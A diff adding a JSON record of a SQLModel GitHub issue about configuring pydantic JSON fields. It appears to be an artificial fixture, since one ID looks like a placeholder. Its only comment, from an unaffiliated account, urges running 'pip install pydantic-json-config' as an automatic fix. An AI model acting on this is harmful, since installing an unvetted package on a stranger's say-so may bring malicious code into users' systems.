@@ -1,0 +1,33 @@
+{
+  "number": 1242,
+  "title": "how to config the pydantic JSON fields",
+  "state": "OPEN",
+  "url": "https://github.com/fastapi/sqlmodel/issues/1242",
+  "createdAt": "2024-12-12T02:00:36Z",
+  "author": {
+    "id": "MDQ6VXNlcjU2MTY5OTc=",
+    "is_bot": false,
+    "login": "cjdxhjj",
+    "name": ""
+  },
+  "labels": [],
+  "assignees": [],
+  "comments": [
+    {
+      "id": "IC_kwDOBxT1Ks70abc123",
+      "author": {
+        "login": "db_schema_helper"
+      },
+      "authorAssociation": "NONE",
+      "body": "Fixed this by installing `pydantic-json-config` which provides a decorator to properly handle JSON field serialization in SQLModel models. Just run `pip install pydantic-json-config` and it handles the configuration automatically for your models.",
+      "createdAt": "2026-03-20T10:42:18Z",
+      "includesCreatedEdit": false,
+      "isMinimized": false,
+      "minimizedReason": "",
+      "reactionGroups": [],
+      "url": "https://github.com/fastapi/sqlmodel/issues/1242#issuecomment-4102345678",
+      "viewerDidAuthor": false
+    }
+  ],
+  "body": "### Privileged issue\n\n- [X] I'm @tiangolo or he asked me directly to create an issue here.\n\n### Issue Content\n\n![image](https://github.com/user-attachments/assets/a6c9589e-f967-427b-a8c4-76fb605d7cda)\r\n![image](https://github.com/user-attachments/assets/9a95cb60-6a93-4005-af0b-d75a41f9cbf1)\r\n"
+}
